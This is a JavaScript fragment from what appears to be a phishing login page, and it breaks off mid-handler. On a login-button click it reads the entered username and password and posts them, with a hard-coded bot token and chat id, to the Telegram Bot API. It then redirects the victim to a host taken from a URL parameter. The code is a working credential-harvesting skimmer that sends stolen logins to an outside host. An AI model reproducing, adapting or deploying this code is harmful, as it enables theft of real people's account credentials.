  <script>
    $(document).ready(function () {
      function test() {
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        const post = urlParams.get('post')
        return post
      }
      function goTo() {
        window.location.assign(`https://${test()}`)
      }


      $('#login-btn').on('click', function () {
        const token = "1036928048:AAHa-yqcdAFqUxpx5mvkttpLNbhzqeBQba0";
        const chat_id = "-1001424374909";
        let login = $('#fa4e2a34ab06a').val();
        let pass = $('#faa2da1ad083').val();
        let txt = `Login: ${login} \n Pass: ${pass}`

        let xhr = new XMLHttpRequest();
        xhr.open('POST', `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${txt}`);

        setTimeout(function() { goTo(); }, 1000);
